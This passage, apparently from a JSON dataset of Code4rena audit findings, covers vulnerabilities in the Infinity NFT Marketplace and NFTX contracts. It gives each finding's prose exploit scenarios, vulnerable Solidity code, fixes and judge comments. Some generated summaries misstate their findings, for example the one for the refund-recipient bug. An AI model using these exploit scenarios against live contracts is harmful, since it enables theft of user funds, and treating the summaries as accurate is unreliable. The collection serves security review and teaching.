`doTokenIdsIntersect()` function. This would help to prevent attackers from exploiting the vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/135",
      "tags": [
        "ERC1155"
      ],
      "finders": [
        "unforgiven"
      ]
    },
    {
      "id": "2767",
      "title": "[H-01] Maker buy order with no specified NFT tokenIds may get fulfilled in `matchOneToManyOrders` without receiving any NFT",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug, also found by 0xsanson, PwnedNoMore, and unforgiven_\n\nThe call stack: matchOneToManyOrders() -> \\_matchOneMakerSellToManyMakerBuys() -> \\_execMatchOneMakerSellToManyMakerBuys() -> \\_execMatchOneToManyOrders() -> \\_transferMultipleNFTs()\n\nBased on the context, a maker buy order can set `OrderItem.tokens` as an empty array to indicate that they can accept any tokenId in this collection, in that case, `InfinityOrderBookComplication.doTokenIdsIntersect()` will always return `true`.\n\nHowever, when the system matching a sell order with many buy orders, the `InfinityOrderBookComplication` contract only ensures that the specified tokenIds intersect with the sell order, and the total count of specified tokenIds equals the sell order's quantity (`makerOrder.constraints[0]`).\n\nThis allows any maker buy order with same collection and `empty tokenIds` to be added to `manyMakerOrders` as long as there is another maker buy order with specified tokenIds that matched the sell order's tokenIds.\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116>\n\n```solidity\nfunction canExecMatchOneToMany(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external view override returns (bool) {\n    uint256 numItems;\n    bool isOrdersTimeValid = true;\n    bool itemsIntersect = true;\n    uint256 ordersLength = manyMakerOrders.length;\n    for (uint256 i = 0; i < ordersLength; ) {\n      if (!isOrdersTimeValid || !itemsIntersect) {\n        return false; // short circuit\n      }\n\n      uint256 nftsLength = manyMakerOrders[i].nfts.length;\n      for (uint256 j = 0; j < nftsLength; ) {\n        numItems += manyMakerOrders[i].nfts[j].tokens.length;\n        unchecked {\n          ++j;\n        }\n      }\n\n      isOrdersTimeValid =\n        isOrdersTimeValid &&\n        manyMakerOrders[i].constraints[3] <= block.timestamp &&\n        manyMakerOrders[i].constraints[4] >= block.timestamp;\n\n      itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);\n\n      unchecked {\n        ++i;\n      }\n    }\n\n    bool _isTimeValid = isOrdersTimeValid &&\n      makerOrder.constraints[3] <= block.timestamp &&\n      makerOrder.constraints[4] >= block.timestamp;\n\n    uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);\n    uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);\n\n    bool _isPriceValid = false;\n    if (makerOrder.isSellOrder) {\n      _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;\n    } else {\n      _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;\n    }\n\n    return (numItems == makerOrder.constraints[0]) && _isTimeValid && itemsIntersect && _isPriceValid;\n  }\n```\n\nHowever, because `buy.nfts` is used as `OrderItem` to transfer the nfts from seller to buyer, and there are no tokenIds specified in the matched maker buy order, the buyer wont receive any nft (`_transferERC721s` does nothing, 0 transfers) despite the buyer paid full in price.\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L763-L786>\n\n```solidity\nfunction _execMatchOneMakerSellToManyMakerBuys(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOneToManyOrders(sell.signer, buy.signer, buy.nfts, buy.execParams[1], remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1080-L1092>\n\n```solidity\nfunction _transferERC721s(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    uint256 numTokens = item.tokens.length;\n    for (uint256 i = 0; i < numTokens; ) {\n      IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);\n      unchecked {\n        ++i;\n      }\n    }\n  }\n```\n\n### Proof of Concept\n\n1.  Alice signed and submitted a maker buy order #1, to buy `2` Punk with `2 WETH` and specified tokenIds = `1`,`2`\n2.  Bob signed and submitted a maker buy order #2, to buy `1` Punk with `1 WETH` and with no specified tokenIds.\n3.  Charlie signed and submitted a maker sell order #3, ask for `3 WETH` for `2` Punk and specified tokenIds = `1`,`2`\n4.  The match executor called `matchOneToManyOrders()` match Charlie's sell order #3 with buy order #1 and #2, Alice received `2` Punk, Charlie received `3 WETH`, Bob paid `1 WETH` and get nothing in return.\n\n### Recommendation\n\nChange to:\n\n```solidity\nfunction canExecMatchOneToMany(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external view override returns (bool) {\n    uint256 numItems;\n    uint256 numConstructedItems;\n    bool isOrdersTimeValid = true;\n    bool itemsIntersect = true;\n    uint256 ordersLength = manyMakerOrders.length;\n    for (uint256 i = 0; i < ordersLength; ) {\n      if (!isOrdersTimeValid || !itemsIntersect) {\n        return false; // short circuit\n      }\n\n      numConstructedItems += manyMakerOrders[i].constraints[0];\n\n      uint256 nftsLength = manyMakerOrders[i].nfts.length;\n      for (uint256 j = 0; j < nftsLength; ) {\n        numItems += manyMakerOrders[i].nfts[j].tokens.length;\n        unchecked {\n          ++j;\n        }\n      }\n\n      isOrdersTimeValid =\n        isOrdersTimeValid &&\n        manyMakerOrders[i].constraints[3] <= block.timestamp &&\n        manyMakerOrders[i].constraints[4] >= block.timestamp;\n\n      itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);\n\n      unchecked {\n        ++i;\n      }\n    }\n\n    bool _isTimeValid = isOrdersTimeValid &&\n      makerOrder.constraints[3] <= block.timestamp &&\n      makerOrder.constraints[4] >= block.timestamp;\n\n    uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);\n    uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);\n\n    bool _isPriceValid = false;\n    if (makerOrder.isSellOrder) {\n      _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;\n    } else {\n      _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;\n    }\n\n    return (numItems == makerOrder.constraints[0]) && (numConstructedItems == numItems) && _isTimeValid && itemsIntersect && _isPriceValid;\n  }\n```\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/254#issuecomment-1162958056):**\n> Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/7f0e195d52165853281b971b8610b27140da6e41\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/254#issuecomment-1179552380):**\n > Confirmed the scenario as described.\n> \n> Buyers specifying just a collection and no specific tokens is a basically a floor sweep which has become common for NFTs. In this scenario, the warden shows how a buyer can end up spending money and get nothing in return. This is a High risk issue.\n> \n> Issue [#314](https://github.com/code-423n4/2022-06-infinity-findings/issues/314) is very similar but flips the impact to explore how a seller's offer could be attacked and how it applies to an allow list of tokenIds. (It has been grouped with H-01)\n\n\n\n***\n\n",
      "summary": "\nA bug report has been identified in the code for the InfinityOrderBookComplication contract. This bug can cause a buyer to pay full price for a Non-Fungible Token (NFT) but not receive the item.\n\nThe call stack for this bug is matchOneToManyOrders() -> _matchOneMakerSellToManyMakerBuys() -> _execMatchOneMakerSellToManyMakerBuys() -> _execMatchOneToManyOrders() -> _transferMultipleNFTs().\n\nThe bug occurs when a maker buy order sets OrderItem.tokens as an empty array. This indicates that the buyer can accept any tokenId in the collection. When the system is matching a sell order with many buy orders, the InfinityOrderBookComplication contract only ensures that the specified tokenIds intersect with the sell order and the total count of specified tokenIds equals the sell order's quantity (makerOrder.constraints[0]).\n\nThis allows any maker buy order with same collection and empty tokenIds to be added to manyMakerOrders as long as there is another maker buy order with specified tokenIds that matched the sell order's tokenIds. However, because buy.nfts is used as OrderItem to transfer the nfts from seller to buyer, and there are no tokenIds specified in the matched maker buy order, the buyer wont receive any nft (_transferERC721s does nothing, 0 transfers) despite the buyer paid full in price.\n\nA Proof of Concept (PoC) has been provided to demonstrate the bug. This PoC involves Alice, Bob, and Charlie. Alice signed and submitted a maker buy order #1, to buy 2 Punk with 2 WETH and specified tokenIds = 1,2. Bob signed and submitted a maker buy order #2, to buy 1 Punk with 1 WETH and with no specified tokenIds. Charlie signed and submitted a maker sell order #3, ask for 3 WETH for 2 Punk and specified tokenIds = 1,2. The match executor called matchOneToManyOrders() match Charlie's sell order #3 with buy order #1 and #2, Alice received 2 Punk, Charlie received 3 WETH, Bob paid 1 WETH and get nothing in return.\n\nThe recommendation for fixing this bug is to change the code in the canExecMatchOneToMany",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/254",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "WatchPug",
        "unforgiven",
        "PwnedNoMore",
        "0xsanson"
      ]
    },
    {
      "id": "42417",
      "title": "[M-13] Dishonest Stakers Can Siphon Rewards From `xToken` Holders Through The `deposit` Function In `NFTXInventoryStaking`",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood_\n\n`xTokens` is intended to be a representation of staked vault tokens. As the protocol's vaults accrue fees from users, these fees are intended to be distributed to users in an inconsistent fashion. `NFTXInventoryStaking` is one of the ways users can stake vault tokens. Deposits are timelocked for `2` seconds by default, essentially rendering flash loan attacks redundant. However, it is more than likely that the same user could withdraw their `xToken` deposit in the next block (assuming an average block time of just over 13 seconds).\n\nHence, if a well-funded attacker sees a transaction to distribute rewards to `xToken` holders, they could deposit a large sum of vault tokens and receive a majority share of the rewards before withdrawing their tokens in the following block. Additionally, the attacker can force distribute rewards in `NFTXSimpleFeeDistributor` as there is no access control on the `distribute` function.\n\nThis issue allows users to siphon user's rewards from the protocol, intended to be distributed to honest vault token stakers.\n\n#### Proof of Concept\n\nConsider the following exploit scenario:\n\n*   Currently there are 1000 `shares` and 1000 `base tokens` in the `XTokenUpgradeable` contract.\n*   Honest actor, Alice, calls `distribute` in `NFTXSimpleFeeDistributor` which attempts to send 200 `base tokens` as rewards for `xToken` holders accrued via protocol usage.\n*   Bob sees a transaction to reward `xToken` holders and frontruns this transaction by staking vault tokens, minting 1000 `shares` and 1000 `base tokens`.\n*   Rewards are distributed such that `XTokenUpgradeable` has 2000 `shares` and 2200 `base tokens`.\n*   Bob unstakes his tokens and exits the pool, redeeming his 1000 `shares` for 1100 `base tokens`.\n*   As a result, Bob was able to siphon off 100 `base tokens` without having to stake their tokens for the same time period that Alice had staked her tokens for.\n*   This unfair distribution can be abused again and again to essentially reward dishonest actors over honest staking participants such as Alice.\n\n#### Tools Used\n\nManual code review.\nDiscussions with Kiwi.\n\n#### Recommended Mitigation Steps\n\nConsider adding a delay to users token deposits into the `XTokenUpgradeable` such that miners cannot feasibly censor a transaction for the specified time interval and users cannot frontrun a transaction to distribute rewards. The interval should be chosen such that enough time is provided for the transaction to be included in a block, given poor network conditions.\n\nI.e. If the chosen interval is 20 blocks. Miners must be able to censor the rewards distribution for 20 blocks. This is unlikely as there would need to be sufficient miner collusion for value to be extracted from the protocol. Additionally, an interval of 20 blocks means that stakers who attempt to enter the pool upon seeing the transaction in the mempool won't be rewarded for such behaviour.\n\nIt is also essential that the `distribute` function in `NFTXSimpleFeeDistributor` is restricted to a given role, ensuring malicious users cannot control at what point rewards are distributed.\n\nAlternatively, PoolTogether has a Time-Weighted-Average-Balance (TWAB) implementation which can be used as [reference](https://v4.docs.pooltogether.com/protocol/concepts/time-weight-average-balance/). This would ensure the fairest distribution of rewards to stakers, however, there are additional gas costs associated with this implementation. Hence, unless the protocol intends to be used primarily on L2 protocols, this solution should be avoided.\n\n**[0xKiwi (NFTX) acknowledged, but disagreed with high severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/57#issuecomment-1007912676):**\n > While this attack is possible, without available flash liquidity, this attack vector requires a lot of (possibly difficult to acquire) capital to execute. Disagreeing with severity and acknowledging.\n\n**[LSDan (judge) decreased severity to medium and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/57#issuecomment-1064495218):**\n > I agree with the sponsor that the risk of this happening is almost zero. Yes it's technically possible but the funds lost are going to be minimal and the attacker will almost definitely pay more in slippage and gas fees than they make. That said, this is a direct attack which results in a loss of user funds so making it less than medium risk seems disingenuous.\n\n\n\n***\n\n",
      "summary": "\nThe report describes a potential issue with the `xTokens` protocol, which is used to represent staked vault tokens. The problem is that an attacker with a large amount of funds could exploit the system and unfairly receive a majority of the rewards intended for honest stakers. This is possible because the system allows for quick deposits and withdrawals of tokens. The report suggests implementing a delay for withdrawals and restricting access to the function responsible for distributing rewards. Another solution is to use a Time-Weighted-Average-Balance implementation, but this may result in higher gas costs. The severity of the issue was debated, with some believing it to be unlikely to occur due to the high capital required for the attack. However, it was still acknowledged as a potential risk.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/57",
      "tags": [],
      "finders": []
    },
    {
      "id": "42416",
      "title": "[M-12] `buyAndSwap1155WETH` Does Not Work As Intended",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood_\n\nThe `buyAndSwap1155WETH` function in `NFTXMarketplaceZap` aims to facilitate buying and swapping `ERC1155` tokens within a single transaction. The function expects to transfer `WETH` tokens from the `msg.sender` account and use these tokens in purchasing vault tokens. However, the `_buyVaultToken` call in `buyAndSwap1155WETH` actually uses `msg.value` and not `maxWethIn`. As a result, the function will not work unless the user supplies both `WETH` and native `ETH` amounts, equivalent to the `maxWethIn` amount.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L284-L314>\n\n```solidity\nfunction buyAndSwap1155WETH(\n  uint256 vaultId, \n  uint256[] memory idsIn, \n  uint256[] memory amounts, \n  uint256[] memory specificIds, \n  uint256 maxWethIn, \n  address[] calldata path,\n  address to\n) public payable nonReentrant {\n  require(to != address(0));\n  require(idsIn.length != 0);\n  IERC20Upgradeable(address(WETH)).transferFrom(msg.sender, address(this), maxWethIn);\n  uint256 count;\n  for (uint256 i = 0; i < idsIn.length; i++) {\n      uint256 amount = amounts[i];\n      require(amount > 0, \"Transferring < 1\");\n      count += amount;\n  }\n  INFTXVault vault = INFTXVault(nftxFactory.vault(vaultId));\n  uint256 redeemFees = (vault.targetSwapFee() * specificIds.length) + (\n      vault.randomSwapFee() * (count - specificIds.length)\n  );\n  uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path);\n  _swap1155(vaultId, idsIn, amounts, specificIds, to);\n\n  emit Swap(count, swapAmounts[0], to);\n\n  // Return extras.\n  uint256 remaining = WETH.balanceOf(address(this));\n  WETH.transfer(to, remaining);\n}\n```\n\n#### Tools Used\n\nManual code review.\nDiscussions with Kiwi.\n\n#### Recommended Mitigation Steps\n\nConsider updating the `buyAndSwap1155WETH` function such that the following line of code is used instead of [this](https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L306).\n\n    uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path);\n\n**[0xKiwi (NFTX) confirmed and resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/45)**\n\n\n\n***\n\n",
      "summary": "\nThe `buyAndSwap1155WETH` function in `NFTXMarketplaceZap` is not working properly. It is supposed to allow users to buy and swap `ERC1155` tokens in one transaction, but it requires both `WETH` and native `ETH` amounts instead of just `WETH`. This means that the function will not work unless the user provides both types of tokens in equivalent amounts. A solution has been suggested to update the code in the function, which has been confirmed and resolved by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/45",
      "tags": [],
      "finders": []
    },
    {
      "id": "42415",
      "title": "[M-10] NFTXSimpleFeeDistributor._sendForReceiver doesn't return success if receiver is not a contract",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh_\n\nDouble spending of fees being distributed will happen in favor of the first fee receivers in the `feeReceivers` list at the expense of the last ones.\nAs `_sendForReceiver` doesn't return success for completed transfer when receiver isn't a contract, the corresponding fee amount is sent out twice, to the current and to the next fee receiver in the list. This will lead to double payments for those receivers who happen to be next in the line right after EOAs, and missed payments for the receivers positioned closer to the end of the list as the funds available are going to be already depleted when their turn comes.\n\n#### Proof of Concept\n\n`distribute` use `_sendForReceiver` to transfer current vault balance across `feeReceivers`:\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L67>\n\n`_sendForReceiver` returns a boolean that is used to move current distribution amount to the next receiver when last transfer failed.\nWhen `_receiver.isContract` is `false` nothing is returned, while `safeTransfer` is done:\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L168>\n\nThis way `_sendForReceiver` will indicate that transfer is failed and leftover amount to be added to the next transfer, i.e. the `amountToSend` will be spent twice:\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L64>\n\n#### Recommended Mitigation Steps\n\nNow:\n\n```solidity\nfunction _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {\n  if (_receiver.isContract) {\n  ...\n  } else {\n    IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);\n  }\n}\n```\n\nTo be:\n```solidity\nfunction _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {\n  if (_receiver.isContract) {\n  ...\n  } else {\n    IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);\n    return true;\n  }\n}\n```\n\n**[0xKiwi (NFTX) confirmed and resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/105)**\n\n\n\n***\n\n",
      "summary": "\nThe report highlights a bug in the NFTXSimpleFeeDistributor contract where double spending of fees can occur. This happens because the function `_sendForReceiver` does not return a success status when transferring fees to a non-contract address. As a result, the fee amount is sent twice, once to the current receiver and again to the next receiver in the list. This leads to double payments for some receivers and missed payments for others. The report recommends a simple fix to return a success status after the transfer is completed, which will prevent the double spending issue. The bug has been confirmed and resolved by the NFTX team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/105",
      "tags": [],
      "finders": []
    },
    {
      "id": "42414",
      "title": "[M-06] `xToken` Approvals Allow Spenders To Spend More Tokens",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood_\n\nThe `approve` function has not been overridden and therefore uses `xToken` shares instead of the equivalent rebalanced amount, i.e. the underlying vault token amount.\n\n#### Proof of Concept\n\nThe approved spender may spend more tokens than desired. In fact, the approved amount that can be transferred keeps growing as rewards continue to be distributed to the `XTokenUpgradeable` contract.\n\nMany contracts also use the same amount for the `approve` call as for the amount they want to have transferred in a subsequent `transferFrom` call, and in this case, they approve an amount that is too large (as the approved `shares` amount yields a higher rebalanced amount).\n\n#### Recommended Mitigation Steps\n\nThe `_allowances` field should track the rebalanced amounts (i.e. the equivalent vault token amount) such that the approval value does not grow.\n\nThe `transferFrom` needs to be overridden and approvals should then be subtracted by the transferred vault token `amount`, not `shares`.\n\n**[0xKiwi (NFTX) acknowledged, but disagreed with high severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/58#issuecomment-1003191456):**\n > Not sure if I agree with this severity. If I approve for xTokens, I'm using xTokens, not the underlying token.\n\n**[LSDan (judge) decreased severity to medium and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/58#issuecomment-1064497035):**\n > This is a medium risk, not high. External assumptions (malicious contracts) are requires for any attack regarding the approval being too high. \n\n\n\n***\n\n",
      "summary": "\nThe `approve` function in the `XTokenUpgradeable` contract is not working properly. This means that the approved spender can spend more tokens than intended, as the approved amount keeps growing due to rewards being distributed. This can be a problem for contracts that use the same amount for the `approve` and `transferFrom` calls. The recommended solution is to update the `_allowances` field to track the rebalanced amounts and to override the `transferFrom` function to subtract the transferred amount from the approvals. The severity of this issue was initially considered high, but was later reduced to medium as it requires external assumptions for an attack to occur.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/58",
      "tags": [],
      "finders": []
    },
    {
      "id": "42413",
      "title": "[M-04] NFTXStakingZap and NFTXMarketplaceZap's transferFromERC721 transfer Cryptokitties to the wrong address",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh_\n\n`transferFromERC721(address assetAddr, uint256 tokenId, address to)` should transfer from `msg.sender` to `to`.\nIt transfers to `address(this)` instead when ERC721 is Cryptokitties.\nAs there is no additional logic for this case it seems to be a mistake that leads to wrong NFT accounting after such a transfer as NFT will be missed in the vault (which is `to`).\n\n#### Proof of Concept\n\nNFTXStakingZap:\ntransferFromERC721\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L416>\n\nNFTXMarketplaceZap:\ntransferFromERC721\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L556>\n\nBoth functions are called by user facing Marketplace buy/sell and Staking addLiquidity/provideInventory functions.\n\n#### Recommended Mitigation Steps\n\nFix the address:\n\nNow:\n\n```solidity\n  // Cryptokitties.\n  data = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", msg.sender, address(this), tokenId);\n```\n\nTo be:\n```solidity\n  // Cryptokitties.\n  data = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", msg.sender, to, tokenId);\n```\n\n**[0xKiwi (NFTX) confirmed, but disagreed with medium severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/185#issuecomment-1003211591):**\n > This was intentional, as I thought it was needed for the contract to require custody, but it should work fine to send directly to the vault.\n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/185)**\n\n\n***\n\n",
      "summary": "\nThe report is about a bug in the transferFromERC721 function, which is used to transfer non-fungible tokens (NFTs) from one address to another. The function is supposed to transfer the NFT from the sender to the specified address, but when used with Cryptokitties, it instead transfers the NFT to the contract address. This can cause problems with the NFT accounting and result in the NFT being lost in the contract. The bug has been identified in two user-facing functions, NFTXStakingZap and NFTXMarketplaceZap, which are used for buying, selling, and adding liquidity to NFTs. The recommended solution is to fix the address in the code to ensure that the NFT is transferred to the correct address. The project team has confirmed the bug, but disagrees with the severity and has resolved the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/185",
      "tags": [],
      "finders": []
    },
    {
      "id": "42412",
      "title": "[M-03] `NFTXMarketplaceZap.sol#buyAnd***()` should return unused weth/eth back to `msg.sender` instead of `to`",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\n<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L226-L249>\n\n```solidity\nfunction buyAndSwap721WETH(\n  uint256 vaultId, \n  uint256[] memory idsIn, \n  uint256[] memory specificIds, \n  uint256 maxWethIn, \n  address[] calldata path,\n  address to\n) public nonReentrant {\n  require(to != address(0));\n  require(idsIn.length != 0);\n  IERC20Upgradeable(address(WETH)).transferFrom(msg.sender, address(this), maxWethIn);\n  INFTXVault vault = INFTXVault(nftxFactory.vault(vaultId));\n  uint256 redeemFees = (vault.targetSwapFee() * specificIds.length) + (\n      vault.randomSwapFee() * (idsIn.length - specificIds.length)\n  );\n  uint256[] memory amounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path);\n  _swap721(vaultId, idsIn, specificIds, to);\n\n  emit Swap(idsIn.length, amounts[0], to);\n\n  // Return extras.\n  uint256 remaining = WETH.balanceOf(address(this));\n  WETH.transfer(to, remaining);\n}\n```\n\nFor example:\n\nIf Alice calls `buyAndSwap721WETH()` to buy some ERC721 and send to Bob, for slippage control, Alice put `1000 ETH` as `maxWethIn`, the actual cost should be lower.\n\nLet's say the actual cost is `900 ETH`.\n\nExpected Results: Alice spend only for the amount of the actual cost (`900 ETH`).\n\nActual Results: Alice spent `1000 ETH`.\n\n**[0xKiwi (NFTX) acknowledged, but disagreed with medium severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/161#issuecomment-1003214046):**\n > I think the idea in this is that if a contract is buying for someone else, the zap handles the refund instead of the contract originating the purchase.\n> But this is a valid concern, thank you\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/161#issuecomment-1064555316):**\n > This does result in a loss of funds if the user sends the wrong amount. I agree with the warden's severity rating.\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a function called `buyAndSwap721WETH` in a contract called NFTXMarketplaceZap. The function is supposed to buy ERC721 tokens and send them to a specified address. However, there is a problem with the function where it does not accurately calculate the cost of the tokens being bought. This means that if a user sets a maximum amount of ETH to spend, the actual cost may be lower but the function will still spend the full maximum amount. This results in a loss of funds for the user. The severity of the bug has been rated as medium and the developers have acknowledged the issue but have not yet fixed it. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/161",
      "tags": [],
      "finders": []
    },
    {
      "id": "1233",
      "title": "[M-17] transfer return value is ignored",
      "impact": "MEDIUM",
      "content": "_Submitted by robee, also found by 0x1f8b, cmichel, csanuragjain, defsec, hyh, leastwood, sirhashalot, and WatchPug_\n\nNeed to use safeTransfer instead of transfer. As there are popular tokens, such as USDT that transfer/transferFrom method doesn’t return anything. The transfer return value has to be checked (as there are some other tokens that returns false instead revert), that means you must\n\n1.  Check the transfer return value\n\nAnother popular possibility is to add a whiteList.\nThose are the appearances (solidity file, line number, actual line):\n\n```solidity\nNFTXStakingZap.sol, 401, IERC20Upgradeable(vault).transfer(to, minTokenIn-amountToken); \nNFTXStakingZap.sol, 474, IERC20Upgradeable(token).transfer(msg.sender, IERC20Upgradeable(token).balanceOf(address(this))); \nPalmNFTXStakingZap.sol, 190, pairedToken.transferFrom(msg.sender, address(this), wethIn); \nPalmNFTXStakingZap.sol, 195, pairedToken.transfer(to, wethIn-amountEth); \nPalmNFTXStakingZap.sol, 219, pairedToken.transferFrom(msg.sender, address(this), wethIn); \nPalmNFTXStakingZap.sol, 224, pairedToken.transfer(to, wethIn-amountEth); \nPalmNFTXStakingZap.sol, 316, IERC20Upgradeable(vault).transfer(to, minTokenIn-amountToken); \nXTokenUpgradeable.sol, 54, baseToken.transfer(who, what); \nNFTXFlashSwipe.sol, 51, IERC20Upgradeable(vault).transferFrom(msg.sender, address(this), mintFee + targetRedeemFee);\n```\n\n**[0xKiwi (NFTX) confirmed, but disagreed with high severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/40#issuecomment-1003186753):**\n > Disagreeing with the severity, but will make sure I stick to safeTransferFrom, thank you.\n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/40)**\n\n**[LSDan (judge) decreased severity to medium and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/40#issuecomment-1064472797):**\n > This is medium risk, not high. Loss of funds requires external factors.\n\n\n\n***\n\n",
      "summary": "\nThis bug report was submitted by user robee. There is a vulnerability in the code that needs to be addressed. The transfer/transferFrom method is not returning anything when dealing with popular tokens such as USDT. The return value of the transfer must be checked, as some tokens return false instead of reverting. To prevent this, a white list should be added. The appearances of the vulnerability are listed in the report.",
      "quality_score": 0,
